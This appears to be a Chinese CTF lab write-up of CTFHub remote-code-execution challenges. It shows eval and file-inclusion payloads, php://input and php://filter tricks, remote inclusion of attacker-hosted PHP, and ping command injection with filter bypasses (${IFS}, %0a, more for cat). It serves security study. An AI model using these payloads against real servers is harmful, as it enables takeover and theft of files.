# CTFHub-RCE学习

<div class="has-toc have-toc">
</div>

## 0x00 前言

菜鸡记录汇总下RCE的学习过程。

## 0x01 eval执行

<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>if&nbsp;(isset($_REQUEST&#91;'cmd']))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;eval($_REQUEST&#91;"cmd"]);&lt;br>}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;highlight_file(__FILE__);&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>

简单审计可以看出，利用危险函数eval执行php代码的特性，用POST或GET方法上传字符串。首先，传入`cmd=phpinfo();`测试，可以得到php的信息。<figure class="wp-block-image size-large">

<img loading="lazy" width="1376" height="682" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片.png" alt="" class="wp-image-1615" /> </figure> 

再利用system函数，这个函数可以执行系统命令并将相应的执行结果输出。上传`cmd=system(ls /);`发现并未得到预计结果，发现是因为函数中存在空格，修改为`cmd=system("ls /");`，发现可疑文件。<figure class="wp-block-image size-large">

<img loading="lazy" width="929" height="41" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-1.png" alt="" class="wp-image-1616" /> </figure> 

最后，上传`cmd=system("cat /flag_11847");`，得到flag。<figure class="wp-block-image size-large">

<img loading="lazy" width="372" height="39" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-2.png" alt="" class="wp-image-1617" /> </figure> 

## 0x02 文件包含<figure class="wp-block-image size-large">

<img loading="lazy" width="687" height="382" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-3.png" alt="" class="wp-image-1619" /> </figure> 

strpos() 函数查找字符串在另一字符串中第一次出现的位置。include() 语句包含并运行指定文件。点击shell，跳转到新页面。

<pre class="wp-block-code"><code>&lt;?php eval($_REQUEST&#91;'ctfhub']);?&gt;</code></pre>

于是构造`file=shell.txt&ctfhub=system("ls");`<figure class="wp-block-image size-large">

<img loading="lazy" width="296" height="81" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-4.png" alt="" class="wp-image-1620" /> </figure> 

继续构造`file=shell.txt&ctfhub=system("ls /");`发现flag文件<figure class="wp-block-image size-large">

<img loading="lazy" width="879" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-5.png" alt="" class="wp-image-1621" /> </figure> 

最后构造`file=shell.txt&ctfhub=system("cat /flag");`<figure class="wp-block-image size-large">

<img loading="lazy" width="365" height="31" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-6.png" alt="" class="wp-image-1622" /> </figure> 

## 0x03 php://input<figure class="wp-block-image size-large">

<img loading="lazy" width="659" height="405" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-7.png" alt="" class="wp-image-1623" /> </figure> 

**php://input**可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<figure class="wp-block-image">

![在这里插入图片描述][1] </figure> 

利用BP抓包后，使用post方式传递`<?php system("ls /");?>`，发现可疑文件。<figure class="wp-block-image size-large">

<img loading="lazy" width="971" height="548" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-8.png" alt="" class="wp-image-1624" /> </figure> 

继续构造，读取flag。<figure class="wp-block-image size-large">

<img loading="lazy" width="905" height="352" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-9.png" alt="" class="wp-image-1625" /> </figure> 

## 0x04 读取源代码<figure class="wp-block-image size-large">

<img loading="lazy" width="657" height="434" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-10.png" alt="" class="wp-image-1627" /> </figure> 

题目暗示了读取，想到了php://filter,php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取，而且提示了flag的位置。构造`file=php://filter/resource=/flag`<figure class="wp-block-image size-large">

<img loading="lazy" width="398" height="132" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-12.png" alt="" class="wp-image-1629" /> </figure> 

## 0x05 远程包含<figure class="wp-block-image size-large">

<img loading="lazy" width="500" height="433" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-13.png" alt="" class="wp-image-1630" /> </figure> 

在自己的云服务器上创建1.txt，内容为：`<?php system("ls /");?>`。再构造`file=http://ip/1.txt`。<figure class="wp-block-image size-large">

<img loading="lazy" width="879" height="116" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-14.png" alt="" class="wp-image-1631" /> </figure> 

修改1.txt文件内容为`<?php system("cat /flag");?>`。<figure class="wp-block-image size-large">

<img loading="lazy" width="358" height="114" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-15.png" alt="" class="wp-image-1632" /> </figure> 

## 0x06 命令注入

题目：这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag<figure class="wp-block-image size-large is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-16.png" alt="" class="wp-image-1633" width="371" height="966" /> </figure> 

页面说明了没有过滤，先输入`127.0.0.1`测试。<figure class="wp-block-image size-large">

<img loading="lazy" width="535" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-17.png" alt="" class="wp-image-1634" /> </figure> 

再输入`127.0.0.1|ls`，分隔命令，发现可疑文件

<blockquote class="wp-block-quote">
  <p>
    linux中：%0a 、%0d 、; 、& 、| 、&&、||<br />windows中：%0a、&、|、%1a
  </p>
</blockquote><figure class="wp-block-image size-large">

<img loading="lazy" width="300" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-18.png" alt="" class="wp-image-1635" /> </figure> 

最后输入`127.0.0.1| cat 281511716412108.php`，没有回显，查看源代码，在注释部分发现flag<figure class="wp-block-image size-large">

<img loading="lazy" width="584" height="590" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-19.png" alt="" class="wp-image-1636" /> </figure> 

## 0x07 过滤cat

题目：过滤了cat命令之后，你还有什么方法能读到 Flag?

<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/cat/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>

首先输入`127.0.0.1|ls`，发现可疑文件<figure class="wp-block-image size-large">

<img loading="lazy" width="331" height="130" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-20.png" alt="" class="wp-image-1637" /> </figure> 

用more代替cat，`127.0.0.1|more flag_90275466365.php`，在源码中发现flag。

## 0x08 过滤空格

题目：这次过滤了空格，你能绕过吗

<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/&nbsp;/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>

首先输入`127.0.0.1|ls`，发现可疑文件<figure class="wp-block-image size-large">

<img loading="lazy" width="340" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-21.png" alt="" class="wp-image-1638" /> </figure> 

空格可以用以下字符串代替：

<blockquote class="wp-block-quote">
  <p>
    < 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
  </p>
</blockquote>

$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。

## 0x09 过滤目录分割符

题目：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗

<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/\//",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>

首先输入`127.0.0.1|ls`，发现可疑文件夹<figure class="wp-block-image size-large">

<img loading="lazy" width="230" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-22.png" alt="" class="wp-image-1639" /> </figure> 

再输入`127.0.0.1|ls flag_is_here`<figure class="wp-block-image size-large">

<img loading="lazy" width="330" height="90" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-23.png" alt="" class="wp-image-1640" /> </figure> 

这道题开始时想复杂了，在研究怎么替换\，陷入了惯性思维，实际上切换到相应的目录即可，输入`127.0.0.1;cd flag_is_here;cat flag_8988745131535.php`

## 0x0A 过滤运算符

题目：过滤了几个运算符, 要怎么绕过呢

<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/(\||\&)/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>

输入`127.0.0.1;ls`，发现可疑文件<figure class="wp-block-image size-large">

<img loading="lazy" width="547" height="155" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-24.png" alt="" class="wp-image-1641" /> </figure> 

构造`127.0.0.1;cat flag_24490310699067.php`，得到flag

## 0x0B 综合过滤练习

题目：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?

<pre class="wp-block-code"><code>&lt;code>&lt;?php&lt;br>&lt;br>$res&nbsp;=&nbsp;FALSE;&lt;br>&lt;br>if&nbsp;(isset($_GET&#91;'ip'])&nbsp;&&&nbsp;$_GET&#91;'ip'])&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$ip&nbsp;=&nbsp;$_GET&#91;'ip'];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;$m&nbsp;=&nbsp;&#91;];&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!preg_match_all("/(\||&|;|&nbsp;|\/|cat|flag|ctfhub)/",&nbsp;$ip,&nbsp;$m))&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;"ping&nbsp;-c&nbsp;4&nbsp;{$ip}";&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exec($cmd,&nbsp;$res);&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$m;&lt;br>&nbsp;&nbsp;&nbsp;&nbsp;}&lt;br>}&lt;br>?&gt;</code>&lt;/code></pre>

首先，构造`ip=127.0.0.1%0als`绕过分割符过滤<figure class="wp-block-image size-large">

<img loading="lazy" width="885" height="497" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-25.png" alt="" class="wp-image-1642" /> </figure> 

构造`ip=127.0.0.1%0acd${IFS}fla*%0als`利用${IFS}绕过空格，*绕过flag，发现flag文件<figure class="wp-block-image size-large">

<img loading="lazy" width="520" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-26.png" alt="" class="wp-image-1643" /> </figure> 

最后构造`ip=127.0.0.1%0acd${IFS}fla%0amore${IFS}fla*`，得到flag。<figure class="wp-block-image size-large">

<img loading="lazy" width="524" height="110" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-27.png" alt="" class="wp-image-1644" /> </figure>

 [1]: https://img-blog.csdnimg.cn/20190212171710961.png
